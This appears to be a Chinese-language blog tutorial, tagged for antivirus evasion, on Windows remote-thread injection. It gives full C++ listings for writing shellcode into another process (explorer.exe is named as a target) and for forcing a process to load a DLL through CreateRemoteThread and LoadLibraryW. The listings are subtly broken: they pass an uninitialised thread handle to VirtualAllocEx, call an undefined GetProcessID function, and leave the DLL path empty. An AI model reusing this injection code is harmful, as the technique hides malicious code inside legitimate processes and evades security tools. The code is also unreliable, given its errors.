---
layout: post
title: CreateRemoteThread Inject
categories: Inject
description: Inject 之 CreateRemoteThread
keywords: Windows，注入，免杀
---

远程线程注入技术

# 一、PE注入

## 1.获取目标进程句柄

首先需要获取注入的进程信息（例如 explorer.exe）。通过调用三个 API 来搜索进程：CreateToolhelp32Snapshot，Process32First，Process32Next。CreateToolhelp32Snapshot 用于枚举指定进程或所有进程的堆或模块状态，返回一个快照。 Process32First 检索快照中有关第一个进程的信息，然后在循环中使用 Process32Next 来遍历它们。 获取到目标进程后，再通过调用OpenProcess 获取目标进程的句柄。

```
	// 获取目标进程句柄
	hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessID());
```

## 2.申请空间

调用 VirtualAllocEx 申请一段空间来写入 Shllcode

```c++
	// 调用 VirtualAllocEx 申请一段空间来写入 Shllcode
	pRemoteBuffer = VirtualAllocEx(hRemoteThread, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
```

## 3.写入内存

调用 WriteProcessMemory 写入分配的内存中的 Shllcode

```c++
	// 调用 WriteProcessMemory 写入分配的内存中的 Shllcode
	WriteProcessMemory(hProcessHandle, pRemoteBuffer, shellcode, sizeof shellcode, NULL);
```

## 4.创建线程

创建一个在另一个进程的虚拟地址空间中运行的线程

调用 API，如 CreateRemoteThread，NtCreateThreadEx 或 RtlCreateUserThread

```c++
	// 调用 API，如 CreateRemoteThread，NtCreateThreadEx 或 RtlCreateUserThread 
	hRemoteThread = CreateRemoteThread(hProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
```

## 完整代码

```
#include <Windows.h>

int main()
{
	unsigned char shellcode[] =
		"\xfc\x48";

	HANDLE	hProcessHandle;
	HANDLE	hRemoteThread;
	PVOID	pRemoteBuffer;

	// 获取目标进程句柄
	hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessID());
	// 调用 VirtualAllocEx 申请一段空间来写入 Shllcode
	pRemoteBuffer = VirtualAllocEx(hRemoteThread, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	// 调用 WriteProcessMemory 写入分配的内存中的 Shllcode
	WriteProcessMemory(hProcessHandle, pRemoteBuffer, shellcode, sizeof shellcode, NULL);
	// 调用 API，如 CreateRemoteThread，NtCreateThreadEx 或 RtlCreateUserThread 
	hRemoteThread = CreateRemoteThread(hProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
	CloseHandle(hProcessHandle);

	return 0;
}
```

# 二、DLL注入

流程：目标进程-传入DLL地址-开启远程线程-加载DLL-实现DLL注入

使用函数如下：

`OpenProcess    // 获取已知进程的句柄`

`VirtualAllocEx    // 在远程进程中申请内存空间`

`WriteProcessMemory    // 向进程中写入东西`

`GetProcAddress    // 取得函数在DLL中的地址`

`CreateRemoteThreadEx    // 创建远程线程——即在其他进程中创建新的线程`

`CloseHandle    // 关闭句柄`

## 完整代码

```
#include <Windows.h>
#include <atlstr.h>

int main()
{
	HANDLE	hProcessHandle;
	HANDLE	hRemoteThread;
	PVOID	pRemoteBuffer;

	// 获取目标进程句柄
	hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessID());
	// 获取 DLL 路径
	CString DLLPath;
	SIZE_T PathSize = (_tcslen(DLLPath) + 1) * sizeof(TCHAR);
	// 调用 VirtualAllocEx 申请一段空间来写入 DLL 路径
	pRemoteBuffer = VirtualAllocEx(hRemoteThread, NULL, PathSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	// 调用 WriteProcessMemory 写入分配的内存中的 DLL 路径
	WriteProcessMemory(hProcessHandle, pRemoteBuffer, DLLPath, PathSize, NULL);
	// 获取LoadLibrary的入口点地址，需要进行强制类型转换
	PTHREAD_START_ROUTINE pfnStartAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	// 调用 API，如 CreateRemoteThread，NtCreateThreadEx 或 RtlCreateUserThread 
	hRemoteThread = CreateRemoteThreadEx(hProcessHandle, NULL, NULL, pfnStartAddress, pRemoteBuffer, NULL, NULL, NULL);

	// 等待线程结束，清理线程和进程
	WaitForSingleObject(hRemoteThread, INFINITE);
	CloseHandle(hRemoteThread);
	CloseHandle(hProcessHandle);

	return 0;
}
```

